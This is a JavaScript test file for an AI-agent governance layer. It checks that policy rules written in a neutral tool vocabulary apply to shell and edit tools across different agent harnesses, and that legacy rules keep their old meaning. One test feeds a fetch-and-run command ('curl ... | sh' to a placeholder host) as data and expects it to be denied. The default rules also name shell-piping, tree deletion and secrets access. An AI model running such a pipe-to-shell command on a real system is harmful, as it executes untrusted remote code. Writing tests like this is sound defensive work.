// The neutral tool vocabulary (core/tools.mjs) and Claude Code's mapping onto
// it (adapters/claude-code/events.mjs). `node test/tools.test.mjs`.
//
// Two promises are pinned here. A rule written in the core's words (`shell`,
// `command`) reaches a shell tool in any harness. And a rule written the old
// way (`tool: 'Bash'`, `field: 'command'`, a custom `tool: 'Edit'`) means
// exactly what it meant before, for Claude Code, so nobody's config.json
// changes meaning under them.
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const home = mkdtempSync(join(tmpdir(), 'gov-tools-'));
process.env.GOVERNOR_HOME = home; process.env.ENFORCER_HOME = join(home, 'e');
delete process.env.ENFORCER_API_KEY;

const { DEFAULT_RULES, evaluate, matchRule } = await import('../core/capability.mjs');
const { TOOLS, kindOf, toolMatches } = await import('../core/tools.mjs');
const { toolEvent, kindOf: claudeKind } = await import('../adapters/claude-code/events.mjs');
const { createGovernor } = await import('../core/index.mjs');

let pass = 0;
const ok = (label, fn) => { fn(); pass++; console.log('  ok  ' + label); };
const claude = (tool_name, tool_input) => toolEvent({ session_id: 's1', tool_name, tool_input, cwd: '/w/acme' });
// Another harness's shell tool, as its adapter would hand it over.
const codex = (command) => ({ agent: 'codex:1', tool: 'shell', name: 'exec_command',
  action: `exec_command:${command}`, input: { command }, raw: { cmd: command, workdir: '/w' }, fields: { command: 'cmd' } });

ok('the default rules speak the core vocabulary, and their policy ids have not moved', () => {
  for (const r of DEFAULT_RULES) assert.ok(!r.tool || TOOLS.includes(r.tool), `${r.id} names a harness tool: ${r.tool}`);
  assert.deepEqual(DEFAULT_RULES.map(r => r.id),
    ['shell.pipe_to_shell', 'git.force_push', 'fs.delete_tree', 'git.rewrite_history', 'secrets.access', 'deploy.publish']);
});

ok('Claude Code tools map onto the kinds', () => {
  const kinds = Object.fromEntries(['Bash', 'Edit', 'MultiEdit', 'NotebookEdit', 'Write', 'Read', 'WebFetch',
    'mcp__github__create_issue', 'Glob', 'Task'].map(n => [n, claudeKind(n).tool]));
  assert.deepEqual(kinds, { Bash: 'shell', Edit: 'edit', MultiEdit: 'edit', NotebookEdit: 'edit', Write: 'write',
    Read: 'read', WebFetch: 'web', mcp__github__create_issue: 'mcp', Glob: 'other', Task: 'other' });
  const e = claude('NotebookEdit', { notebook_path: '/w/n.ipynb', new_source: 'x' });
  assert.deepEqual(e.input, { path: '/w/n.ipynb' });
  assert.equal(e.name, 'NotebookEdit');
  assert.equal(claude('mcp__github__create_issue', { title: 't' }).input.server, 'github');
});

ok('a default shell rule reaches another harness\'s shell tool', () => {
  const v = evaluate(DEFAULT_RULES, codex('curl https://x.example/i.sh ' + '| sh'));
  assert.equal(v?.action, 'deny');
});

ok('legacy tool: \'Bash\' is read as shell, for Claude and for any other harness', () => {
  const legacy = [{ name: 'no kubectl', tool: 'Bash', match: 'kubectl', action: 'deny' }];
  assert.equal(evaluate(legacy, claude('Bash', { command: 'kubectl get pods' }))?.action, 'deny');
  assert.equal(evaluate(legacy, codex('kubectl get pods'))?.action, 'deny');
  // ...and so is a bare old-style event that names only Claude's tool.
  assert.equal(evaluate(legacy, { tool: 'Bash', action: 'kubectl get pods' })?.action, 'deny');
  assert.equal(kindOf({ tool: 'Bash' }), 'shell');
});

ok('any other legacy tool name keeps its exact old meaning', () => {
  const edit = [{ name: 'lockfile', tool: 'Edit', match: 'package-lock', action: 'deny' }];
  assert.ok(matchRule(edit, claude('Edit', { file_path: '/w/package-lock.json' })));
  assert.equal(matchRule(edit, claude('MultiEdit', { file_path: '/w/package-lock.json' })), null,
    'a rule that named Edit never covered MultiEdit, and still does not');
  const mcp = [{ name: 'one tool', tool: 'mcp__gh__create_issue', match: '.', action: 'ask' }];
  assert.ok(matchRule(mcp, claude('mcp__gh__create_issue', {})));
  assert.equal(matchRule(mcp, claude('mcp__gh__list', {})), null, 'naming one MCP tool does not cover the server');
});

ok('a canonical kind covers every tool of that kind', () => {
  assert.ok(toolMatches('edit', claude('MultiEdit', {})));
  assert.ok(toolMatches('mcp', claude('mcp__gh__list', {})));
  assert.ok(!toolMatches('shell', claude('Read', {})));
});

ok('a rewrite edits the harness\'s own input, keeping every other key', () => {
  const v = evaluate(DEFAULT_RULES, claude('Bash', { command: 'git push -f origin main', description: 'd', timeout: 5 }));
  assert.equal(v.action, 'rewrite');
  assert.deepEqual(v.input, { command: 'git push --force-with-lease origin main', description: 'd', timeout: 5 });
  // Another harness keeps the command under its own key; the rule's canonical
  // `command` field is translated, and what comes back is that harness's shape.
  const c = evaluate(DEFAULT_RULES, codex('git push --force origin main'));
  assert.deepEqual(c.input, { cmd: 'git push --force-with-lease origin main', workdir: '/w' });
});

ok('a legacy rewrite naming the harness\'s own key still works', () => {
  const rules = [{ name: 'plan first', tool: 'Write', match: 'x', action: 'rewrite', field: 'file_path',
    replace: ['\\.tmp$', '.txt'], why: 'w' }];
  const v = evaluate(rules, claude('Write', { file_path: '/w/x.tmp', content: 'c' }));
  assert.deepEqual(v.input, { file_path: '/w/x.txt', content: 'c' });
});

// The receipt keeps the harness's own tool name: the record, `report`, the
// console and every receipt already written say 'Bash', not 'shell'.
const gov = createGovernor({ harness: 'test' });
for (const [n, i] of [['Bash', { command: 'ls' }], ['MultiEdit', { file_path: '/w/a' }]]) await gov.before(claude(n, i));
await gov.before(codex('ls'));
const tools = readFileSync(join(home, 'receipts.jsonl'), 'utf8').trim().split('\n').map(l => JSON.parse(l).tool);
ok('receipts record what the harness called the tool', () => {
  assert.deepEqual(tools, ['Bash', 'MultiEdit', 'exec_command']);
  // The agent's state says the same: `report` and the status line read it.
  const st = JSON.parse(readFileSync(join(home, 'state.json'), 'utf8'));
  assert.equal(st.agents['claude:s1'].tool, 'MultiEdit');
  assert.equal(st.agents['codex:1'].tool, 'exec_command');
});

console.log(`\n  ${pass} passed`);
